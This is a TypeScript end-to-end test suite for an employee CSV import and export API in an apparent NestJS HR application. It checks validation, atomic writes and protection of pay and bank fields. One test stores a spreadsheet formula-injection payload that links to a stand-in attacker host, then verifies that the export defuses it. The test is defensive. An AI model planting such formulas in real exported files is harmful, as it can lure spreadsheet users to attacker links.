import assert from "node:assert/strict";
import { after, before, describe, it } from "node:test";

import type { INestApplication } from "@nestjs/common";
import { Test } from "@nestjs/testing";
import request from "supertest";

import { AppModule } from "../src/app.module.js";
import { configure } from "../src/bootstrap.js";
import { validateEnv } from "../src/config/env.schema.js";
import { PrismaService } from "../src/database/prisma.service.js";
import { IMPORT_COLUMNS, parseCsv, readRows } from "../src/modules/employees/import.js";

const PREFIX = "E2EIMP";

function quoted(value: string): string {
  return `"${value.replace(/"/g, '""')}"`;
}
const ENTITY = "DEFAULT";
const HEAD = "code,fullName,legalEntityCode,managerCode,dateOfBirth,gender,baseSalary,insuranceSalary";

interface Fault {
  row: number;
  column: string;
  code: string;
}

interface Report {
  applied: boolean;
  rows: number;
  toCreate: number;
  toUpdate: number;
  payKept: number;
  faults: Fault[];
}

const OTHER_ENTITY = `${PREFIX}-LE`;
const OTHER_DEPARTMENT = `${PREFIX}-D`;
const RETIRED_DEPARTMENT = `${PREFIX}-OLD`;

describe("employee import (e2e)", () => {
  let app: INestApplication;
  let http: ReturnType<INestApplication["getHttpServer"]>;
  let db: PrismaService;
  let token = "";

  async function sweep(): Promise<void> {
    await db.employee.deleteMany({ where: { code: { startsWith: PREFIX } } });
    await db.department.deleteMany({ where: { code: { in: [OTHER_DEPARTMENT, RETIRED_DEPARTMENT] } } });
    await db.legalEntity.deleteMany({ where: { code: OTHER_ENTITY } });
  }

  async function send(csv: string, apply: boolean): Promise<Report> {
    const res = await request(http)
      .post(`/employees/import${apply ? "?apply=true" : ""}`)
      .set("Authorization", `Bearer ${token}`)
      .send({ csv });
    assert.equal(res.status, 201);
    return res.body as Report;
  }

  function faultAt(report: Report, code: string): Fault | undefined {
    return report.faults.find((one) => one.code === code);
  }

  before(async () => {
    const env = validateEnv();
    const moduleRef = await Test.createTestingModule({ imports: [AppModule] }).compile();
    app = moduleRef.createNestApplication();
    configure(app);
    await app.init();
    http = app.getHttpServer();
    db = app.get(PrismaService);
    await sweep();

    const signedIn = await request(http)
      .post("/auth/login")
      .send({ email: "admin@kiosk.local", password: env.SEED_ADMIN_PASSWORD ?? "" });
    assert.equal(signedIn.status, 200, "admin could not sign in");
    token = signedIn.body.accessToken;
  });

  after(async () => {
    await sweep();
    await app.close();
  });

  it("keeps a comma inside a quoted field", () => {
    const grid = parseCsv('a,b\r\n"Nguyễn Văn A, thử","say ""hi"""\r\n');
    assert.deepEqual(grid[1], ["Nguyễn Văn A, thử", 'say "hi"']);
  });

  it("names the line, the column and the value of every fault", async () => {
    const report = await send(
      [
        HEAD,
        `${PREFIX}01,Người một,${ENTITY},,1990-01-01,MALE,1000,900`,
        `,Không có mã,${ENTITY},,,,,`,
        `${PREFIX}03,Ngày sai,${ENTITY},,01-01-1990,,,`,
        `${PREFIX}04,Giới tính sai,${ENTITY},,,OTHER,,`,
        `${PREFIX}05,Nửa vế lương,${ENTITY},,,,1000,`,
        `${PREFIX}01,Trùng mã,${ENTITY},,,,,`,
      ].join("\r\n"),
      false,
    );
    assert.equal(report.applied, false);
    assert.equal(faultAt(report, "VALUE_REQUIRED")?.row, 3);
    assert.equal(faultAt(report, "DATE_INVALID")?.row, 4);
    assert.equal(faultAt(report, "GENDER_INVALID")?.row, 5);
    assert.equal(faultAt(report, "SALARY_PAIR_INCOMPLETE")?.row, 6);
    assert.equal(faultAt(report, "CODE_REPEATED_IN_FILE")?.row, 7);
  });

  it("refuses a column it does not know rather than dropping it", async () => {
    const report = await send(`code,fullName,luong\r\n${PREFIX}09,Người chín,1000`, false);
    assert.equal(faultAt(report, "COLUMN_UNKNOWN")?.column, "luong");
    assert.equal(report.rows, 0, "a header nobody agreed on is not worth reading rows from");
  });

  it("writes nothing at all while the file still has a fault", async () => {
    const report = await send(
      [HEAD, `${PREFIX}10,Người mười,${ENTITY},,,,,`, `${PREFIX}11,Ngày sai,${ENTITY},,31-31-2026,,,`].join("\r\n"),
      true,
    );
    assert.equal(report.applied, false);
    assert.equal(await db.employee.count({ where: { code: { startsWith: PREFIX } } }), 0);
  });

  it("creates on a clean file and links a manager the file names later", async () => {
    const report = await send(
      [
        HEAD,
        `${PREFIX}20,Nhân viên,${ENTITY},${PREFIX}21,1992-02-02,FEMALE,12000000,10000000`,
        `${PREFIX}21,Quản lý,${ENTITY},,1980-03-03,MALE,20000000,18000000`,
      ].join("\r\n"),
      true,
    );
    assert.equal(report.applied, true);
    assert.equal(report.toCreate, 2);
    const staff = await db.employee.findUnique({
      where: { code: `${PREFIX}20` },
      include: { manager: { select: { code: true } }, compensation: true },
    });
    assert.equal(staff?.manager?.code, `${PREFIX}21`, "a manager further down the file still links");
    assert.equal(staff?.gender, "FEMALE");
    assert.equal(staff?.compensation[0]?.insuranceSalary.toFixed(0), "10000000");
  });

  it("updates on a second pass and leaves the pay history alone", async () => {
    const report = await send(
      [HEAD, `${PREFIX}20,Tên đã đổi,${ENTITY},${PREFIX}21,1992-02-02,FEMALE,13000000,11000000`].join("\r\n"),
      true,
    );
    assert.equal(report.toUpdate, 1);
    assert.equal(report.toCreate, 0);
    assert.equal(report.payKept, 1, "the report hides that the pay columns were not written");
    const staff = await db.employee.findUnique({
      where: { code: `${PREFIX}20` },
      include: { compensation: true },
    });
    assert.equal(staff?.fullName, "Tên đã đổi");
    assert.equal(staff?.compensation.length, 1, "a re-import wrote a pay record");
    assert.equal(staff?.compensation[0]?.insuranceSalary.toFixed(0), "10000000", "a re-import rewrote pay history");
  });

  it("writes only the columns the file names, and never the address or bank of somebody already here", async () => {
    const code = `${PREFIX}30`;
    const first = await send(
      [
        "code,fullName,legalEntityCode,personalEmail,phone,nationalId,bankAccount,bankName",
        `${code},Người ba mươi,${ENTITY},first@example.com,0901000001,079000000030,111,Ngân hàng A`,
      ].join("\r\n"),
      true,
    );
    assert.equal(first.applied, true, JSON.stringify(first.faults));
    const second = await send(
      [
        "code,fullName,personalEmail,bankAccount,bankName",
        `${code},Người ba mươi mốt,second@example.com,222,Ngân hàng B`,
      ].join("\r\n"),
      true,
    );
    assert.equal(second.applied, true, JSON.stringify(second.faults));
    const held = await db.employee.findUniqueOrThrow({ where: { code } });
    assert.equal(held.fullName, "Người ba mươi mốt");
    assert.equal(held.phone, "0901000001", "a column the file left out was wiped");
    assert.equal(held.nationalId, "079000000030", "a column the file left out was wiped");
    assert.equal(held.personalEmail, "first@example.com", "an import moved the address a change is reported to");
    assert.equal(held.bankAccount, "111", "an import moved where the pay goes");
  });

  it("checks the address format and the length of every text field", async () => {
    const report = await send(
      [
        "code,fullName,legalEntityCode,personalEmail",
        `${PREFIX}40,Người bốn mươi,${ENTITY},not-an-address`,
        `${PREFIX}41,${"x".repeat(65)},${ENTITY},`,
      ].join("\r\n"),
      false,
    );
    assert.equal(faultAt(report, "EMAIL_INVALID")?.row, 2);
    assert.equal(faultAt(report, "VALUE_TOO_LONG")?.column, "fullName");
  });

  it("reads a department inside the line's legal entity, and only an active one", async () => {
    const entity = await db.legalEntity.create({ data: { code: OTHER_ENTITY, name: "Pháp nhân thử nhập" } });
    await db.department.createMany({
      data: [
        { legalEntityId: entity.id, code: OTHER_DEPARTMENT, name: "Phòng thử" },
        { legalEntityId: entity.id, code: RETIRED_DEPARTMENT, name: "Phòng đã đóng", active: false },
      ],
    });
    const report = await send(
      [
        "code,fullName,legalEntityCode,departmentCode",
        `${PREFIX}50,Sai pháp nhân,${ENTITY},${OTHER_DEPARTMENT}`,
        `${PREFIX}51,Đúng pháp nhân,${OTHER_ENTITY},${OTHER_DEPARTMENT}`,
        `${PREFIX}52,Phòng đã đóng,${OTHER_ENTITY},${RETIRED_DEPARTMENT}`,
        `${PREFIX}53,Pháp nhân lạ,NO-SUCH-ENTITY,`,
        `${PREFIX}54,Không nói pháp nhân,,`,
      ].join("\r\n"),
      false,
    );
    const at = (row: number) => report.faults.filter((one) => one.row === row).map((one) => one.code);
    assert.deepEqual(at(2), ["DEPARTMENT_UNKNOWN"], "a department of another entity was accepted");
    assert.deepEqual(at(3), [], "the line's own entity did not find its department");
    assert.deepEqual(at(4), ["DEPARTMENT_UNKNOWN"], "a retired department took a new person");
    assert.deepEqual(at(5), ["LEGAL_ENTITY_UNKNOWN"]);
    assert.deepEqual(at(6), ["LEGAL_ENTITY_REQUIRED"], "two entities and none named still guessed one");
  });

  it("exports a formula as text Excel will not run, and imports it back unchanged", async () => {
    const payload = "=HYPERLINK(\"http://attacker.example\",\"x\")";
    const row = await db.employee.findFirstOrThrow({ where: { code: { startsWith: PREFIX } } });
    await db.employee.update({ where: { id: row.id }, data: { phone: payload } });
    const res = await request(http)
      .get("/employees/export")
      .set("Authorization", `Bearer ${token}`);
    const grid = parseCsv(res.text);
    const at = (grid[0] as string[]).indexOf("phone");
    const line = grid.find((cells) => cells[0] === row.code) as string[];
    assert.equal(line[at], `'${payload}`, "the export handed Excel a live formula");
    const back = [grid[0] as string[], line].map((cells) => cells.map(quoted).join(",")).join("\r\n");
    assert.equal(readRows(back).rows[0]?.phone, payload, "the text mark came back in on import");
    await db.employee.update({ where: { id: row.id }, data: { phone: row.phone } });
  });

  it("exports in the shape the import takes straight back", async () => {
    const res = await request(http)
      .get("/employees/export")
      .set("Authorization", `Bearer ${token}`);
    assert.equal(res.status, 200);
    assert.ok(res.text.startsWith("\ufeff"), "Excel needs the byte order mark");

    const grid = parseCsv(res.text);
    assert.deepEqual(grid[0], [...IMPORT_COLUMNS], "the header is the importer's own");

    const mine = grid.filter((line) => (line[0] ?? "").startsWith(PREFIX));
    assert.ok(mine.length >= 2, "the two rows this suite made are in the file");

    // Only this suite's own rows go back in: a parallel suite deleting one of
    // its departments between the two calls is not this test's subject.
    const back = [grid[0] as string[], ...mine].map((line) => line.map(quoted).join(",")).join("\r\n");
    const report = await send(back, false);
    assert.equal(report.faults.length, 0, "the file this system writes is a file it accepts");
    assert.equal(report.rows, mine.length);
    assert.equal(report.toUpdate, mine.length, "everybody in it is already here");
  });
});
